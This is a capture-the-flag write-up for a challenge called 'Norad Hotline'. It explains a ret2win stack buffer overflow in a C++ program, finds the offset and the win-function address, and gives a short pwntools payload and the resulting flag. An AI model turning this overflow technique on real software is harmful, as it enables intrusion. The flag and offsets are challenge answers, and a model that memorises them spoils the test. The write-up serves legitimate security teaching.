## Norad Hotline  

<img src="images/chall.png" width=600>

This challenge is essentially a ret2win. We can first run `checksec` on the binary, which shows that it has minimal protections.  

<img src="images/checksec.png" width=600>

The main program prompts us for a caller name and phone number, before calling `route_call()`.  

```c
void handle_call()
{
    PhoneLine caller;
    NORADHotline hotline;

    std::cout << "Welcome to Santa's Hotline!\n\n";

    std::cout << "Please enter your name: ";
    std::cout.flush();
    std::cin.width(32);
    std::cin >> hotline.caller_name;

    std::cout << "Please enter the phone number you're calling from: ";
    std::cout.flush();

    std::cin >> caller.phone_number;

    std::cout << "\nRing ring! Connecting your call...\n";

    hotline.route_call();

    hotline.disconnect();
}
```

Looking at the implementation for the `NORADHotline` class, we can see that it has a `connect_to_santa()` function which outputs the flag, but `route_call()` never calls it. This is our win function.  

```c
class NORADHotline : public PhoneLine
{   
    ...

    virtual void route_call()
    {
        std::cout << "CONTINENTAL AIR DEFENSE COMMAND\n";
        std::cout << "HELLO! This is a MILITARY HOTLINE.\n";
        std::cout << "Caller '" << this->caller_name << "' has reached the wrong number.\n";
        std::cout << "Transferring to public relations...\n";
    }

    ...

    virtual void connect_to_santa()
    {
        std::cout << "Connecting to SANTA!";
        std::cout << "\n";
        std::cout << " HO HO HO! This is Colonel Shoup speaking!\n";
        std::cout << "\n";
        std::cout << " Well hello there! You've reached the Continental Air Defense Command, but don't worry - we've got Santa on our radar!\n";
        std::cout << " According to our tracking systems, Santa is currently over the North Pole preparing for his Christmas Eve flight!\n";
        std::cout << "\n";
        std::cout << " Btw kid, here's a special gift for you:\n";
        std::cout << "\n ";

        std::cout << FLAG;

        std::cout << "\n";
        exit(0);
    }
};
```

`NORADHotline` inherits from the `PhoneLine` class, which allocates buffers for the `caller_name` and `phone_number` attributes.  

In the main program, we can overflow `phone_number`, then place the `connect_to_santa()` address right after that, making the program return to our win function.  

```c
class PhoneLine
{
public:
    char caller_name[32];
    char phone_number[16];
    int call_duration;
```

To find out how many bytes we need for the buffer overflow, we can use `cyclic 100` to generate a `100` character string, then run the binary using `gdb` and input it under the phone number.  

In the stack trace, we can see that the string has indeed overflown the buffer into `RSP`.  

<img src="images/overflow.png" width=600>

We can then use `cyclic` again to get the number of bytes needed for the overflow.  

```bash
cyclic -l "iaaajaaa"    # 32
```

To get the address of our win function, we can just search the disassembly.    

```bash
# 000000000040165c <_ZN12NORADHotline16connect_to_santaEv>:
objdump -d norad_hotline | grep connect_to_santa 
```

Now that we have all the essential info, we can construct our payload and send it with `pwntools`.  

```python
payload  = b"A" * OFFSET
payload += p64(0x000000000040165c)

r.sendlineafter(b"name:", b"a")
r.sendlineafter(b"calling from:", payload)
```

Flag: `YBN25{VT4BL3_H!J4CK_TO_N0RTH_P0L3}`